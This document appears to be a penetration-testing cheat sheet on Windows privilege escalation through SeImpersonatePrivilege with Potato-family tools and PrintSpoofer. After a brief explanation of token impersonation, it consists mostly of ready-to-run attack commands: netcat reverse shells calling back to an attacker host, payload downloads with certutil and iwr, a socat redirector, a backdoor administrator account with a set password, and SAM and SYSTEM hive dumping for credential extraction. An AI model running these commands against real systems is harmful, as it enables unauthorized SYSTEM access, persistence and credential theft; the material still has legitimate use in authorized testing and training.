# PrintSpoofer & Potato Attacks

These tools abuse **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege** to escalate from a service account to SYSTEM.

Very common on Windows targets — IIS, MSSQL, Jenkins, and most Windows services run with these privileges by default.

---

## Why This Privilege Exists (And Why It's Exploitable)

Windows has a concept called **token impersonation** — the ability for a process to temporarily act as a different user. This is intentional and needed for legitimate Windows functionality. For example:

- An IIS web server handles requests from many different users. When user A makes a request, IIS needs to temporarily "become" user A to access files that user A is allowed to see. That requires `SeImpersonatePrivilege`.
- A SQL Server service needs to impersonate the connecting user to enforce database permissions.

So Windows grants this privilege to service accounts by design. The problem is it lets you impersonate **any** user that authenticates to your process — including SYSTEM.

**How the attack works:**
1. You trigger a privileged Windows component (Print Spooler, COM server, etc.) to authenticate back to a server you control
2. That component authenticates as SYSTEM
3. Your tool captures that SYSTEM token
4. You impersonate it → you are now SYSTEM

The different Potato/PrintSpoofer tools use different Windows components to trigger step 1, which is why different tools work on different OS versions.

---

## Check If You Have the Privilege

```cmd
whoami /priv
```

Look for either of these as **Enabled**:
```
SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
SeAssignPrimaryTokenPrivilege Replace a process level token               Enabled
```

If you see it → run one of the tools below immediately.

---

## GodPotato (Best — Works on Windows 2012–2022)

Most reliable across modern Windows versions. Use this first.

```sh
# Download: https://github.com/BeichenDream/GodPotato

# Interactive SYSTEM shell
.\GodPotato.exe -cmd "cmd /c whoami"

# Add yourself as admin (then RDP/WinRM in)
.\GodPotato.exe -cmd "cmd /c net user hacker Pa33w0rd! /add"
.\GodPotato.exe -cmd "cmd /c net localgroup administrators hacker /add"

# Reverse shell back to Kali
.\GodPotato.exe -cmd "cmd /c C:\temp\nc.exe -e cmd.exe <KALI-IP> 4444"
```

**From Kali workflow:**
```sh
# 1. Get initial low-priv shell (evil-winrm, psexec, webshell, etc.)
evil-winrm -i <ip> -u iisuser -p password

# 2. Upload GodPotato
upload /path/to/GodPotato.exe

# 3. Run it
.\GodPotato.exe -cmd "cmd /c whoami"
# Output: nt authority\system ← done
```

---

## PrintSpoofer (Windows 10 / Server 2016–2019)

Abuses the Print Spooler service to get a SYSTEM token.

```sh
# Download: https://github.com/itm4n/PrintSpoofer

# SYSTEM shell (interactive — needs a real TTY, works in evil-winrm)
.\PrintSpoofer.exe -i -c cmd.exe

# Run a command
.\PrintSpoofer.exe -c "whoami"

# Reverse shell
.\PrintSpoofer.exe -c "C:\temp\nc.exe -e cmd.exe <KALI-IP> 4444"
```

> If `-i` doesn't give you a shell, use `-c` with a reverse shell payload instead.

---

## RoguePotato (Server 2019 when PrintSpoofer fails)

Requires a redirector on Kali (port 135):

```sh
# On Kali — redirect port 135 to your machine
socat tcp-listen:135,reuseaddr,fork tcp:<KALI-IP>:9999 &

# On target
.\RoguePotato.exe -r <KALI-IP> -e "C:\temp\nc.exe -e cmd.exe <KALI-IP> 4444" -l 9999
```

---

## JuicyPotato (Older — Windows 7/Server 2008–2016)

Needs a valid CLSID for the target OS. Use when on older systems.

```sh
# Download: https://github.com/ohpe/juicy-potato
.\JuicyPotato.exe -t * -p cmd.exe -l 1337 -c {CLSID}

# Find CLSIDs for your OS: https://github.com/ohpe/juicy-potato/tree/master/CLSID
# Common ones:
# Server 2016: {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
# Win 10:      {F3DAF5D9-7537-4B1E-BCE2-FAE6B6D3E14D}
```

> JuicyPotato doesn't work on Server 2019+ — use GodPotato or PrintSpoofer instead.

---

## SweetPotato (All-in-one)

Combines multiple potato techniques, tries them in order.

```sh
.\SweetPotato.exe -e EfsRpc -p C:\temp\nc.exe -a "-e cmd.exe <KALI-IP> 4444"
```

---

## Which Tool to Use

| OS | First Try | Fallback |
|---|---|---|
| Windows 10 / 11 / Server 2019 / 2022 | GodPotato | SweetPotato, then PrintSpoofer |
| Server 2016 | GodPotato | PrintSpoofer, then RoguePotato |
| Server 2012 / 2012 R2 | JuicyPotato | GodPotato |
| Windows 7 / Server 2008 / 2008 R2 | JuicyPotato | Rotten Potato (legacy) |
| Unknown — start here | GodPotato | SweetPotato (chains multiple techniques) |

---

## Getting the Tools onto Target

```sh
# On Kali — serve tools
python3 -m http.server 8080

# In your shell on target (PowerShell)
iwr -uri http://<KALI-IP>:8080/GodPotato.exe -OutFile C:\temp\GodPotato.exe

# Or certutil (cmd)
certutil -urlcache -split -f http://<KALI-IP>:8080/GodPotato.exe C:\temp\GodPotato.exe

# Or evil-winrm built-in upload
upload /path/to/GodPotato.exe
```

---

## After Getting SYSTEM

```cmd
# Add admin user for persistent access
net user hacker Pa33w0rd! /add
net localgroup administrators hacker /add

# Dump SAM
.\GodPotato.exe -cmd "cmd /c reg save HKLM\SAM C:\temp\sam.hive && reg save HKLM\SYSTEM C:\temp\system.hive"
# Transfer to Kali and parse:
secretsdump.py -sam sam.hive -system system.hive LOCAL
```
